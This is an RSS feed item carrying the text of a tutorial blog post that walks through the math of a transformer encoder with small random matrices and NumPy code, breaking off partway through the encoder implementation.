<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 03 Jan 2024 23:00:09 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Understand how transformers work by demystifying the math behind them (168 pts)]]></title>
            <link>https://osanseviero.github.io/hackerllama/blog/posts/random_transformer/</link>
            <guid>38859976</guid>
            <pubDate>Wed, 03 Jan 2024 21:10:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://osanseviero.github.io/hackerllama/blog/posts/random_transformer/">https://osanseviero.github.io/hackerllama/blog/posts/random_transformer/</a>, See on <a href="https://news.ycombinator.com/item?id=38859976">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="quarto-content">
<!-- sidebar -->
<!-- margin-sidebar -->
    
<!-- main -->
<main id="quarto-document-content">



<!-- WARNING: THIS FILE WAS AUTOGENERATED! DO NOT EDIT! -->
<p>In this blog post, we‚Äôll do an end-to-end example of the math within a transformer model. The goal is to get a good understanding of how the model works. To make this manageable, we‚Äôll do lots of simplification. As we‚Äôll be doing quite a bit of the math by hand, we‚Äôll reduce the dimensions of the model. For example, rather than using embeddings of 512 values, we‚Äôll use embeddings of 4 values. This will make the math easier to follow! We‚Äôll use random vectors and matrices, but you can use your own values if you want to follow along.</p>
<p>As you‚Äôll see, the math is not that complicated. The complexity comes from the number of steps and the number of parameters. I recommend you to read the <a href="http://jalammar.github.io/illustrated-transformer/">The Illustrated Transformer</a> blog before reading this blog post (or reading in parallel). It‚Äôs a great blog post that explains the transformer model in a very intuitive (and illustrative!) way and I don‚Äôt intend to explain what it‚Äôs already explained there. My goal is to explain the ‚Äúhow‚Äù of the transformer model, not the ‚Äúwhat‚Äù. If you want to dive even deeper, check out the famous original paper: <a href="https://arxiv.org/abs/1706.03762">Attention is all you need</a>.</p>
<p><strong>Prerequisites</strong></p>
<p>A basic understanding of linear algebra is required - we‚Äôll mostly do simple matrix multiplications, so no need to be an expert. Apart from that, basic understanding of Machine Learning and Deep Learning will be useful.</p>
<p><strong>What is covered here?</strong></p>
<ul>
<li>An end-to-end example of the math within a transformer model during inference</li>
<li>An explanation of attention mechanisms</li>
<li>An explanation of residual connections and layer normalization</li>
<li>Some code to scale it up!</li>
</ul>
<p>Without further ado, let‚Äôs get started! The original transformer model has two parts: encoder and decoder. Our goal will be to use this model as a translation tool! We‚Äôll first focus on the encoder part.</p>
<section id="encoder">
<h2 data-anchor-id="encoder">Encoder</h2>
<p>The whole goal of the encoder is to generate a rich embedding representation of the input text. This embedding will capture semantic information about the input, and will then be passed to the decoder to generate the output text. The encoder is composed of a stack of N layers. Before we jump into the layers, we need to see how to pass the words (or tokens) into the model.</p>
<div>

<p>Embeddings are a somewhat overused term. We‚Äôll first create an embedding that will be the input to the encoder. The encoder also outputs an embedding (also called hidden states sometimes). The decoder will also receive an embedding! üòÖ The whole point of an embedding is to represent a token as a vector.</p>
</div>
<section id="embedding-the-text">
<h3 data-anchor-id="embedding-the-text">1. Embedding the text</h3>
<p>Let‚Äôs say that we want to translate ‚ÄúHello World‚Äù from English to Spanish. The first step is to turn each input token into a vector using an embedding algorithm. This is a learned encoding. Usually we use a big vector size such as 512, but let‚Äôs do 4 for our example so we can keep the maths manageable. I‚Äôll assign some random values to each token (as mentioned, this mapping is usually learned by the model).</p>
<p>Hello -&gt; [1,2,3,4]</p>
<p>World -&gt; [2,3,4,5]</p>
<p>We can represent our input as a single matrix</p>
<p><span>\[
E = \begin{bmatrix}
1 &amp; 2 &amp; 3 &amp; 4 \\
2 &amp; 3 &amp; 4 &amp; 5
\end{bmatrix}
\]</span></p>
<div>

<p>Although we could manage the two embeddings as separate vectors, it‚Äôs easier to manage them as a single matrix. This is because we‚Äôll be doing matrix multiplications as we move forward!</p>
</div>
</section>
<section id="positional-encoding">
<h3 data-anchor-id="positional-encoding">2 Positional encoding</h3>
<p>The embedding above has no information about the position of the word in the sentence, so we need to feed some positional information. The way we do this is by adding a positional encoding to the embedding. There are different choices on how to obtain these - we could use a learned embedding or a fixed vector. The original paper uses a fixed vector as they see almost no difference between the two approaches (see section 3.5 of the original paper). We‚Äôll use a fixed vector as well. Sine and cosine functions have a wave-like pattern, and they repeat over time. By using these functions, each position in the sentence gets a unique yet consistent pattern of numbers. These are the functions they use in the paper (section 3.5):</p>
<p><span>\[
PE(pos, 2i) = \sin\left(\frac{pos}{10000^{2i/d_{\text{model}}}}\right)
\]</span></p>
<p><span>\[
PE(pos, 2i+1) = \cos\left(\frac{pos}{10000^{2i/d_{\text{model}}}}\right)
\]</span></p>
<p>The idea is to interpolate between sine and cosine for each value in the embedding (even indices will use sine, odd indices will use cosine). Let‚Äôs calculate them for our example!</p>
<p>For ‚ÄúHello‚Äù</p>
<ul>
<li>i = 0 (even): PE(0,0) = sin(0 / 10000^(0 / 4)) = sin(0) = 0</li>
<li>i = 1 (odd): PE(0,1) = cos(0 / 10000^(2*1 / 4)) = cos(0) = 1</li>
<li>i = 2 (even): PE(0,2) = sin(0 / 10000^(2*2 / 4)) = sin(0) = 0</li>
<li>i = 3 (odd): PE(0,3) = cos(0 / 10000^(2*3 / 4)) = cos(0) = 1</li>
</ul>
<p>For ‚ÄúWorld‚Äù</p>
<ul>
<li>i = 0 (even): PE(1,0) = sin(1 / 10000^(0 / 4)) = sin(1 / 10000^0) = sin(1) ‚âà 0.84</li>
<li>i = 1 (odd): PE(1,1) = cos(1 / 10000^(2*1 / 4)) = cos(1 / 10000^0.5) ‚âà cos(0.01) ‚âà 0.99</li>
<li>i = 2 (even): PE(1,2) = sin(1 / 10000^(2*2 / 4)) = sin(1 / 10000^1) ‚âà 0</li>
<li>i = 3 (odd): PE(1,3) = cos(1 / 10000^(2*3 / 4)) = cos(1 / 10000^1.5) ‚âà 1</li>
</ul>
<p>So concluding</p>
<ul>
<li>‚ÄúHello‚Äù -&gt; [0, 1, 0, 1]</li>
<li>‚ÄúWorld‚Äù -&gt; [0.84, 0.99, 0, 1]</li>
</ul>
<p>Note that these encodings have the same dimension as the original embedding.</p>
</section>
<section id="add-positional-encoding-and-embedding">
<h3 data-anchor-id="add-positional-encoding-and-embedding">3. Add positional encoding and embedding</h3>
<p>We now add the positional encoding to the embedding. This is done by adding the two vectors together.</p>
<p>‚ÄúHello‚Äù = [1,2,3,4] + [0, 1, 0, 1] = [1, 3, 3, 5] ‚ÄúWorld‚Äù = [2,3,4,5] + [0.84, 0.99, 0, 1] = [2.84, 3.99, 4, 6]</p>
<p>So our new matrix, which will be the input to the encoder, is:</p>
<p><span>\[
E = \begin{bmatrix}
1 &amp; 3 &amp; 3 &amp; 5 \\
2.84 &amp; 3.99 &amp; 4 &amp; 6
\end{bmatrix}
\]</span></p>
<p>If you look at the original paper‚Äôs image, what we just did is the bottom left part of the image (the embedding + positional encoding).</p>
<div>
<figure>
<p><a href="https://arxiv.org/abs/1706.03762"><img src="https://osanseviero.github.io/hackerllama/blog/posts/random_transformer/transformer.png"></a></p>
<figcaption>Transformer model from the original ‚Äúattention is all you need‚Äù paper</figcaption>
</figure>
</div>
</section>
<section id="self-attention">
<h3 data-anchor-id="self-attention">4. Self-attention</h3>
<section id="matrices-definition">
<h4 data-anchor-id="matrices-definition">4.1 Matrices Definition</h4>
<p>We‚Äôll now introduce the concept of multi-head attention. Attention is a mechanism that allows the model to focus on certain parts of the input. Multi-head attention is a way to allow the model to jointly attend to information from different representation subspaces. This is done by using multiple attention heads. Each attention head will have its own K, V, and Q matrices.</p>
<p>Let‚Äôs use 2 attention heads for our example. We‚Äôll use random values for these matrices. Each matrix will be a 4x3 matrix. With this, each matrix will transform the 4-dimensional embeddings into 3-dimensional keys, values, and queries. This reduces the dimensionality for attention mechanism, which helps in managing the computational complexity. Note that using a too small attention size will hurt the performance of the model. Let‚Äôs use the following values (just random values):</p>
<p><strong>For the first head</strong></p>
<p><span>\[
\begin{align*}
WK1 &amp;= \begin{bmatrix}
1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 0 \\
1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 0
\end{bmatrix}, \quad
WV1 &amp;= \begin{bmatrix}
0 &amp; 1 &amp; 1 \\
1  &amp; 0 &amp; 0 \\
1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 0
\end{bmatrix}, \quad
WQ1 &amp;= \begin{bmatrix}
0 &amp; 0 &amp; 0 \\
1 &amp; 1 &amp; 0 \\
0 &amp; 0 &amp; 1 \\
1 &amp; 1 &amp; 0
\end{bmatrix}
\end{align*}
\]</span></p>
<p><strong>For the second head</strong></p>
<p><span>\[
\begin{align*}
WK2 &amp;= \begin{bmatrix}
0 &amp; 1 &amp; 1 \\
1 &amp; 0 &amp; 1 \\
1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 0
\end{bmatrix}, \quad
WV2 &amp;= \begin{bmatrix}
1 &amp; 0 &amp; 0 \\
0 &amp; 1 &amp; 1 \\
0 &amp; 0 &amp; 1 \\
1 &amp; 0 &amp; 0
\end{bmatrix}, \quad
WQ2 &amp;= \begin{bmatrix}
1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 0 \\
1 &amp; 0 &amp; 0 \\
0 &amp; 1 &amp; 1
\end{bmatrix}
\end{align*}
\]</span></p>
</section>
<section id="keys-queries-and-values-calculation">
<h4 data-anchor-id="keys-queries-and-values-calculation">4.2 Keys, queries, and values calculation</h4>
<p>We now need to multiply our input embeddings with the weight matrices to obtain the keys, queries, and values.</p>
<p><strong>Key calculation</strong></p>
<p><span>\[
\begin{align*}
E \times WK1 &amp;= \begin{bmatrix}
1 &amp; 3 &amp; 3 &amp; 5 \\
2.84 &amp; 3.99 &amp; 4 &amp; 6
\end{bmatrix}
\begin{bmatrix}
1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 0 \\
1 &amp; 0 &amp; 1 \\
0 &amp; 1 &amp; 0
\end{bmatrix} \\
&amp;= \begin{bmatrix}
(1 \times 1) + (3 \times 0) + (3 \times 1) + (5 \times 0) &amp; (1 \times 0) + (3 \times 1) + (3 \times 0) + (5 \times 1) &amp; (1 \times 1) + (3 \times 0) + (3 \times 1) + (5 \times 0) \\
(2.84 \times 1) + (3.99 \times 0) + (4 \times 1) + (6 \times 0) &amp; (2.84 \times 0) + (4 \times 1) + (4 \times 0) + (6 \times 1) &amp; (2.84 \times 1) + (4 \times 0) + (4 \times 1) + (6 \times 0)
\end{bmatrix} \\
&amp;= \begin{bmatrix}
4 &amp; 8 &amp; 4 \\
6.84 &amp; 9.99 &amp; 6.84
\end{bmatrix}
\end{align*}
\]</span></p>
<p>Ok, I actually do not want to do the math by hand for all of these - it gets a bit repetitive plus it breaks the site. So let‚Äôs cheat and use NumPy to do the calculations for us.</p>
<p>We first define the matrices</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>import</span> numpy <span>as</span> np</span>
<span id="cb1-2"></span>
<span id="cb1-3">WK1 <span>=</span> np.array([[<span>1</span>, <span>0</span>, <span>1</span>], [<span>0</span>, <span>1</span>, <span>0</span>], [<span>1</span>, <span>0</span>, <span>1</span>], [<span>0</span>, <span>1</span>, <span>0</span>]])</span>
<span id="cb1-4">WV1 <span>=</span> np.array([[<span>0</span>, <span>1</span>, <span>1</span>], [<span>1</span>, <span>0</span>, <span>0</span>], [<span>1</span>, <span>0</span>, <span>1</span>], [<span>0</span>, <span>1</span>, <span>0</span>]])</span>
<span id="cb1-5">WQ1 <span>=</span> np.array([[<span>0</span>, <span>0</span>, <span>0</span>], [<span>1</span>, <span>1</span>, <span>0</span>], [<span>0</span>, <span>0</span>, <span>1</span>], [<span>1</span>, <span>0</span>, <span>0</span>]])</span>
<span id="cb1-6"></span>
<span id="cb1-7">WK2 <span>=</span> np.array([[<span>0</span>, <span>1</span>, <span>1</span>], [<span>1</span>, <span>0</span>, <span>1</span>], [<span>1</span>, <span>1</span>, <span>0</span>], [<span>0</span>, <span>1</span>, <span>0</span>]])</span>
<span id="cb1-8">WV2 <span>=</span> np.array([[<span>1</span>, <span>0</span>, <span>0</span>], [<span>0</span>, <span>1</span>, <span>1</span>], [<span>0</span>, <span>0</span>, <span>1</span>], [<span>1</span>, <span>0</span>, <span>0</span>]])</span>
<span id="cb1-9">WQ2 <span>=</span> np.array([[<span>1</span>, <span>0</span>, <span>1</span>], [<span>0</span>, <span>1</span>, <span>0</span>], [<span>1</span>, <span>0</span>, <span>0</span>], [<span>0</span>, <span>1</span>, <span>1</span>]])</span></code></pre></div>
<p>And let‚Äôs confirm that I didn‚Äôt make any mistakes in the calculations above.</p>
<div>
<div id="cb2"><pre><code><span id="cb2-1">embedding <span>=</span> np.array([[<span>1</span>, <span>3</span>, <span>3</span>, <span>5</span>], [<span>2.84</span>, <span>3.99</span>, <span>4</span>, <span>6</span>]])</span>
<span id="cb2-2">K1 <span>=</span> embedding <span>@</span> WK1</span>
<span id="cb2-3">K1</span></code></pre></div>
<div>
<pre><code>array([[4.  , 8.  , 4.  ],
       [6.84, 9.99, 6.84]])</code></pre>
</div>
</div>
<p>Phew! Let‚Äôs now get the values and queries</p>
<p><strong>Value calculations</strong></p>
<div>
<pre><code>array([[6.  , 6.  , 4.  ],
       [7.99, 8.84, 6.84]])</code></pre>
</div>
<p><strong>Query calculations</strong></p>
<div>
<pre><code>array([[8.  , 3.  , 3.  ],
       [9.99, 3.99, 4.  ]])</code></pre>
</div>
<p>Let‚Äôs skip the second head for now and focus on the first head final score. We‚Äôll come back to the second head later.</p>
</section>
<section id="attention-calculation">
<h4 data-anchor-id="attention-calculation">4.3 Attention calculation</h4>
<p>Calculating the attention score requires a couple of steps:</p>
<ol type="1">
<li>Calculate the dot product of the query with each key</li>
<li>Divide the result by the square root of the dimension of the key vector</li>
<li>Apply a softmax function to obtain the attention weights</li>
<li>Multiply each value vector by the attention weights</li>
</ol>
<section id="dot-product-of-query-with-each-key">
<h5 data-anchor-id="dot-product-of-query-with-each-key">4.3.1 Dot product of query with each key</h5>
<p>The score for ‚ÄúHello‚Äù requires calculating the dot product of q1 with each key vector (k1 and k2)</p>
<p><span>\[
\begin{align*}
q1 \cdot k1 &amp;= \begin{bmatrix} 8 &amp; 3 &amp; 3 \end{bmatrix} \cdot \begin{bmatrix} 4 \\ 8 \\ 4 \end{bmatrix} \\
&amp;= 8 \cdot 4 + 3 \cdot 8 + 3 \cdot 4 \\
&amp;= 68
\end{align*}
\]</span></p>
<p>In matrix world, that would be Q1 multiplied by the transpose of K1</p>
<p><span>\[\begin{align*}
Q1 \times K1^\top &amp;= \begin{bmatrix} 8 &amp; 3 &amp; 3 \\ 9.99 &amp; 3.99 &amp; 4 \end{bmatrix} \times \begin{bmatrix} 4 &amp; 6.84 \\ 8 &amp; 9.99 \\ 4 &amp; 6.84 \end{bmatrix} \\
&amp;= \begin{bmatrix}
    8 \cdot 4 + 3 \cdot 8 + 3 \cdot 4 &amp; 8 \cdot 6.84 + 3 \cdot 9.99 + 3 \cdot 6.84 \\
    9.99 \cdot 4 + 3.99 \cdot 8 + 4 \cdot 4 &amp; 9.99 \cdot 6.84 + 3.99 \cdot 9.99 + 4 \cdot 6.84
    \end{bmatrix} \\
&amp;= \begin{bmatrix}
    68 &amp; 105.21 \\
    87.88 &amp; 135.5517
    \end{bmatrix}
\end{align*}\]</span></p>
<p>I‚Äôm prone to do mistakes, so let‚Äôs confirm with Python once again</p>
<div>
<div id="cb8"><pre><code><span id="cb8-1">scores1 <span>=</span> Q1 <span>@</span> K1.T</span>
<span id="cb8-2">scores1</span></code></pre></div>
<div>
<pre><code>array([[ 68.    , 105.21  ],
       [ 87.88  , 135.5517]])</code></pre>
</div>
</div>
</section>
<section id="divide-by-square-root-of-dimension-of-key-vector">
<h5 data-anchor-id="divide-by-square-root-of-dimension-of-key-vector">4.3.2 Divide by square root of dimension of key vector</h5>
<p>We then divide the scores by the square root of the dimension (d) of the keys (3 in this case, but 64 in the original paper). Why? For large values of d, the dot product grows too large (we‚Äôre adding the multiplication of a bunch of numbers, after all, leading to high values). And large values are bad! We‚Äôll discuss soon more about this.</p>
<div>
<div id="cb10"><pre><code><span id="cb10-1">scores1 <span>=</span> scores1 <span>/</span> np.sqrt(<span>3</span>)</span>
<span id="cb10-2">scores1</span></code></pre></div>
<div>
<pre><code>array([[39.2598183 , 60.74302182],
       [50.73754166, 78.26081048]])</code></pre>
</div>
</div>
</section>
<section id="apply-softmax-function">
<h5 data-anchor-id="apply-softmax-function">4.3.3 Apply softmax function</h5>
<p>We then softmax to normalize so they are all positive and add up to 1.</p>
<div title="What is softmax?">
<p>Softmax is a function that takes a vector of values and returns a vector of values between 0 and 1, where the sum of the values is 1. It‚Äôs a nice way of obtaining probabilities. It‚Äôs defined as follows:</p>
<p><span>\[
\text{softmax}(x_i) = \frac{e^{x_i}}{\sum_{j=1}^n e^{x_j}}
\]</span></p>
<p>Don‚Äôt be intimidated by the formula - it‚Äôs actually quite simple. Let‚Äôs say we have the following vector:</p>
<p><span>\[
x = \begin{bmatrix} 1 &amp; 2 &amp; 3 \end{bmatrix}
\]</span></p>
<p>The softmax of this vector would be:</p>
<p><span>\[
\text{softmax}(x) = \begin{bmatrix} \frac{e^1}{e^1 + e^2 + e^3} &amp; \frac{e^2}{e^1 + e^2 + e^3} &amp; \frac{e^3}{e^1 + e^2 + e^3} \end{bmatrix} = \begin{bmatrix} 0.09 &amp; 0.24 &amp; 0.67 \end{bmatrix}
\]</span></p>
<p>As you can see, the values are all positive and add up to 1.</p>
</div>
<div>
<div id="cb12"><pre><code><span id="cb12-1"><span>def</span> softmax(x):</span>
<span id="cb12-2">    <span>return</span> np.exp(x) <span>/</span> np.<span>sum</span>(np.exp(x), axis<span>=</span><span>1</span>, keepdims<span>=</span><span>True</span>)</span>
<span id="cb12-3"></span>
<span id="cb12-4"></span>
<span id="cb12-5">scores1 <span>=</span> softmax(scores1)</span>
<span id="cb12-6">scores1</span></code></pre></div>
<div>
<pre><code>array([[4.67695573e-10, 1.00000000e+00],
       [1.11377182e-12, 1.00000000e+00]])</code></pre>
</div>
</div>
</section>
<section id="multiply-value-matrix-by-attention-weights">
<h5 data-anchor-id="multiply-value-matrix-by-attention-weights">4.3.4 Multiply value matrix by attention weights</h5>
<p>We then multiply times the value matrix</p>
<div>
<div id="cb14"><pre><code><span id="cb14-1">attention1 <span>=</span> scores1 <span>@</span> V1</span>
<span id="cb14-2">attention1</span></code></pre></div>
<div>
<pre><code>array([[7.99, 8.84, 6.84],
       [7.99, 8.84, 6.84]])</code></pre>
</div>
</div>
<p>Let‚Äôs combine 4.3.1, 4.3.2, 4.3.3, and 4.3.4 into a single formula using matrices (this is from section 3.2.1 of the original paper):</p>
<p><span>\[
Attention(Q,K,V) = \text{softmax}\left(\frac{QK^\top}{\sqrt{d}}\right)V
\]</span></p>
<p>Yes, that‚Äôs it! All the math we just did can easily be encapsulated in the attention formula above! Let‚Äôs now translate this to code!</p>
<div id="cb16"><pre><code><span id="cb16-1"><span>def</span> attention(x, WQ, WK, WV):</span>
<span id="cb16-2">    K <span>=</span> x <span>@</span> WK</span>
<span id="cb16-3">    V <span>=</span> x <span>@</span> WV</span>
<span id="cb16-4">    Q <span>=</span> x <span>@</span> WQ</span>
<span id="cb16-5"></span>
<span id="cb16-6">    scores <span>=</span> Q <span>@</span> K.T</span>
<span id="cb16-7">    scores <span>=</span> scores <span>/</span> np.sqrt(<span>3</span>)</span>
<span id="cb16-8">    scores <span>=</span> softmax(scores)</span>
<span id="cb16-9">    scores <span>=</span> scores <span>@</span> V</span>
<span id="cb16-10">    <span>return</span> scores</span></code></pre></div>
<div>
<div id="cb17"><pre><code><span id="cb17-1">attention(embedding, WQ1, WK1, WV1)</span></code></pre></div>
<div>
<pre><code>array([[7.99, 8.84, 6.84],
       [7.99, 8.84, 6.84]])</code></pre>
</div>
</div>
<p>We confirm we got same values as above. Let‚Äôs chear and use this to obtain the attention scores the second attention head:</p>
<div>
<div id="cb19"><pre><code><span id="cb19-1">attention2 <span>=</span> attention(embedding, WQ2, WK2, WV2)</span>
<span id="cb19-2">attention2</span></code></pre></div>
<div>
<pre><code>array([[8.84, 3.99, 7.99],
       [8.84, 3.99, 7.99]])</code></pre>
</div>
</div>
<p>If you‚Äôre wondering how come the attention is the same for the two embeddings, it‚Äôs because the softmax is taking our scores to 0 and 1. See this:</p>
<div>
<div id="cb21"><pre><code><span id="cb21-1">softmax(((embedding <span>@</span> WQ2) <span>@</span> (embedding <span>@</span> WK2).T) <span>/</span> np.sqrt(<span>3</span>))</span></code></pre></div>
<div>
<pre><code>array([[1.10613872e-14, 1.00000000e+00],
       [4.95934510e-20, 1.00000000e+00]])</code></pre>
</div>
</div>
<p>This is due to bad initialization of the matrices and small vector sizes. Large differences in the scores before applying softmax will just be amplified with softmax, leading to one value being close to 1 and others close to 0. In practice, our initial embedding matrices‚Äô values were maybe too high, leading to high values for the keys, values, and queries, which just grew larger as we multiplied them.</p>
<p>Remember when we were dividing by the square root of the dimension of the keys? This is why we do that. If we don‚Äôt do that, the values of the dot product will be too large, leading to large values after the softmax. In this case, though, it seems it wasn‚Äôt enough given our small values! As a short-term hack, we can scale down the values by a larger amount than the square root of 3. Let‚Äôs redefine the attention function but scaling down by 30. This is not a good long-term solution, but it will help us get different values for the attention scores. We‚Äôll get back to a better solution later.</p>
<div id="cb23"><pre><code><span id="cb23-1"><span>def</span> attention(x, WQ, WK, WV):</span>
<span id="cb23-2">    K <span>=</span> x <span>@</span> WK</span>
<span id="cb23-3">    V <span>=</span> x <span>@</span> WV</span>
<span id="cb23-4">    Q <span>=</span> x <span>@</span> WQ</span>
<span id="cb23-5"></span>
<span id="cb23-6">    scores <span>=</span> Q <span>@</span> K.T</span>
<span id="cb23-7">    scores <span>=</span> scores <span>/</span> <span>30</span>  <span># we just changed this</span></span>
<span id="cb23-8">    scores <span>=</span> softmax(scores)</span>
<span id="cb23-9">    scores <span>=</span> scores <span>@</span> V</span>
<span id="cb23-10">    <span>return</span> scores</span></code></pre></div>
<div>
<div id="cb24"><pre><code><span id="cb24-1">attention1 <span>=</span> attention(embedding, WQ1, WK1, WV1)</span>
<span id="cb24-2">attention1</span></code></pre></div>
<div>
<pre><code>array([[7.54348784, 8.20276657, 6.20276657],
       [7.65266185, 8.35857269, 6.35857269]])</code></pre>
</div>
</div>
<div>
<div id="cb26"><pre><code><span id="cb26-1">attention2 <span>=</span> attention(embedding, WQ2, WK2, WV2)</span>
<span id="cb26-2">attention2</span></code></pre></div>
<div>
<pre><code>array([[8.45589591, 3.85610456, 7.72085664],
       [8.63740591, 3.91937741, 7.84804146]])</code></pre>
</div>
</div>
</section>
<section id="heads-attention-output">
<h5 data-anchor-id="heads-attention-output">4.3.5 Heads‚Äô attention output</h5>
<p>The next layer of the encoder will expect a single matrix, not two. The first step will be to concatenate the two heads‚Äô outputs (section 3.2.2 of the original paper)</p>
<div>
<div id="cb28"><pre><code><span id="cb28-1">attentions <span>=</span> np.concatenate([attention1, attention2], axis<span>=</span><span>1</span>)</span>
<span id="cb28-2">attentions</span></code></pre></div>
<div>
<pre><code>array([[7.54348784, 8.20276657, 6.20276657, 8.45589591, 3.85610456,
        7.72085664],
       [7.65266185, 8.35857269, 6.35857269, 8.63740591, 3.91937741,
        7.84804146]])</code></pre>
</div>
</div>
<p>We finally multiply this concatenated matrix by a weight matrix to obtain the final output of the attention layer. This weight matrix is also learned! The dimension of the matrix ensures we go back to the same dimension as the embedding (4 in our case).</p>
<div>
<div id="cb30"><pre><code><span id="cb30-1"><span># Just some random values</span></span>
<span id="cb30-2">W <span>=</span> np.array(</span>
<span id="cb30-3">    [</span>
<span id="cb30-4">        [<span>0.79445237</span>, <span>0.1081456</span>, <span>0.27411536</span>, <span>0.78394531</span>],</span>
<span id="cb30-5">        [<span>0.29081936</span>, <span>-</span><span>0.36187258</span>, <span>-</span><span>0.32312791</span>, <span>-</span><span>0.48530339</span>],</span>
<span id="cb30-6">        [<span>-</span><span>0.36702934</span>, <span>-</span><span>0.76471963</span>, <span>-</span><span>0.88058366</span>, <span>-</span><span>1.73713022</span>],</span>
<span id="cb30-7">        [<span>-</span><span>0.02305587</span>, <span>-</span><span>0.64315981</span>, <span>-</span><span>0.68306653</span>, <span>-</span><span>1.25393866</span>],</span>
<span id="cb30-8">        [<span>0.29077448</span>, <span>-</span><span>0.04121674</span>, <span>0.01509932</span>, <span>0.13149906</span>],</span>
<span id="cb30-9">        [<span>0.57451867</span>, <span>-</span><span>0.08895355</span>, <span>0.02190485</span>, <span>0.24535932</span>],</span>
<span id="cb30-10">    ]</span>
<span id="cb30-11">)</span>
<span id="cb30-12">Z <span>=</span> attentions <span>@</span> W</span>
<span id="cb30-13">Z</span></code></pre></div>
<div>
<pre><code>array([[ 11.46394285, -13.18016471, -11.59340253, -17.04387829],
       [ 11.62608573, -13.47454936, -11.87126395, -17.4926367 ]])</code></pre>
</div>
</div>
<p>The image from <a href="https://jalammar.github.io/illustrated-transformer/">The Ilustrated Transformer</a> encapsulates all of this in a single image <img src="http://jalammar.github.io/images/t/transformer_multi-headed_self-attention-recap.png" alt="Attention"></p>
</section>
</section>
</section>
<section id="feed-forward-layer">
<h3 data-anchor-id="feed-forward-layer">5. Feed-forward layer</h3>
<section id="basic-feed-forward-layer">
<h4 data-anchor-id="basic-feed-forward-layer">5.1 Basic feed-forward layer</h4>
<p>After the self-attention layer, the encoder has a feed-forward neural network (FFN). This is a simple network with two linear transformations and a ReLU activation in between. The Illustrated Transformer blog post does not dive into it, so let me briefly explain a bit more. The goal of the FFN is to process and transformer the representation produced by the attention mechanism. The flow is usually as follows (see section 3.3 of the original paper):</p>
<ol type="1">
<li><strong>First linear layer:</strong> this usually expands the dimensionality of the input. For example, if the input dimension is 512, the output dimension might be 2048. This is done to allow the model to learn more complex functions. In our simple of example with dimension of 4, we‚Äôll expand to 8.</li>
<li><strong>ReLU activation:</strong> This is a non-linear activation function. It‚Äôs a simple function that returns 0 if the input is negative, and the input if it‚Äôs positive. This allows the model to learn non-linear functions. The math is as follows:</li>
</ol>
<p><span>\[
\text{ReLU}(x) = \max(0, x)
\]</span></p>
<ol start="3" type="1">
<li><strong>Second linear layer:</strong> This is the opposite of the first linear layer. It reduces the dimensionality back to the original dimension. In our example, we‚Äôll reduce from 8 to 4.</li>
</ol>
<p>We can represent all of this as follows</p>
<p><span>\[
\text{FFN}(x) = \text{ReLU}(xW_1 + b_1)W_2 + b_2
\]</span></p>
<p>Just as a reminder, the input for this layer is the Z we calculated in the self-attention above. Here are the values as a reminder</p>
<p><span>\[
Z =
\begin{bmatrix}
11.46394281 &amp; -13.18016469 &amp; -11.59340253 &amp; -17.04387833 \\
11.62608569 &amp; -13.47454934 &amp; -11.87126395 &amp; -17.49263674
\end{bmatrix}
\]</span></p>
<p>Let‚Äôs now define some random values for the weight matrices and bias vectors. I‚Äôll do it with code, but you can do it by hand if you feel patient!</p>
<div id="cb32"><pre><code><span id="cb32-1">W1 <span>=</span> np.random.randn(<span>4</span>, <span>8</span>)</span>
<span id="cb32-2">W2 <span>=</span> np.random.randn(<span>8</span>, <span>4</span>)</span>
<span id="cb32-3">b1 <span>=</span> np.random.randn(<span>8</span>)</span>
<span id="cb32-4">b2 <span>=</span> np.random.randn(<span>4</span>)</span></code></pre></div>
<p>And now let‚Äôs write the forward pass function</p>
<div id="cb33"><pre><code><span id="cb33-1"><span>def</span> relu(x):</span>
<span id="cb33-2">    <span>return</span> np.maximum(<span>0</span>, x)</span>
<span id="cb33-3"></span>
<span id="cb33-4"><span>def</span> feed_forward(Z, W1, b1, W2, b2):</span>
<span id="cb33-5">    <span>return</span> relu(Z.dot(W1) <span>+</span> b1).dot(W2) <span>+</span> b2</span></code></pre></div>
<div>
<div id="cb34"><pre><code><span id="cb34-1">output_encoder <span>=</span> feed_forward(Z, W1, b1, W2, b2)</span>
<span id="cb34-2">output_encoder</span></code></pre></div>
<div>
<pre><code>array([[ -3.24115016,  -9.7901049 , -29.42555675, -19.93135286],
       [ -3.40199463,  -9.87245924, -30.05715408, -20.05271018]])</code></pre>
</div>
</div>
</section>
<section id="encapsulating-everything-the-random-encoder">
<h4 data-anchor-id="encapsulating-everything-the-random-encoder">5.2 Encapsulating everything: The Random Encoder</h4>
<p>Let‚Äôs now write some code to have the multi-head attention and the feed-forward, all together in the encoder block.</p>
<div>

<p>The code optimizes for understanding and educational purposes, not for performance! Don‚Äôt judge too hard!</p>
</div>
<div id="cb36"><pre><code><span id="cb36-1">d_embedding <span>=</span> <span>4</span></span>
<span id="cb36-2">d_key <span>=</span> d_value <span>=</span> d_query <span>=</span> <span>3</span></span>
<span id="cb36-3">d_feed_forward <span>=</span> <span>8</span></span>
<span id="cb36-4">n_attention_heads <span>=</span> <span>2</span></span>
<span id="cb36-5"></span>
<span id="cb36-6"><span>def</span> attention(x, WQ, WK, WV):</span>
<span id="cb36-7">    K <span>=</span> x <span>@</span> WK</span>
<span id="cb36-8">    V <span>=</span> x <span>@</span> WV</span>
<span id="cb36-9">    Q <span>=</span> x <span>@</span> WQ</span>
<span id="cb36-10"></span>
<span id="cb36-11">    scores <span>=</span> Q <span>@</span> K.T</span>
<span id="cb36-12">    scores <span>=</span> scores <span>/</span> np.sqrt(d_key)</span>
<span id="cb36-13">    scores <span>=</span> softmax(scores)</span>
<span id="cb36-14">    scores <span>=</span> scores <span>@</span> V</span>
